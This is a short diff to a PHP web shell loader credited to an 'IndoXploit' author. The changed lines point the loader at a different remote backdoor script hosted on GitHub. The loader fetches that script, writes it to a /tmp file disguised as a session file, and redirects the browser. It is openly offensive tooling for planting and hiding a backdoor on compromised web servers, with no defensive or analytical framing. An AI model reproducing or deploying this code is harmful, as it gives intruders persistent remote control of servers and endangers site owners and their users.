@@ -3,7 +3,7 @@
 # Bypass 406 Not Acceptable & Auto Delete Shell
 # Coded by: L0c4lh34rtz - IndoXploit
  
-$URL = 'https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php';  # Backdoor URL
+$URL = 'https://raw.githubusercontent.com/justikail/webshell/main/c0m.php';  # Backdoor URL
 $TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!
  
 function M() {
@@ -15,7 +15,7 @@ function M() {
         fwrite($HANDLE, $FGT);
         fclose($HANDLE);
     }
-    echo '<script>window.location="?indoxploit";</script>';
+    echo '<script>window.location="?&refresh";</script>';
 }
  
 if(file_exists($TMP)) {
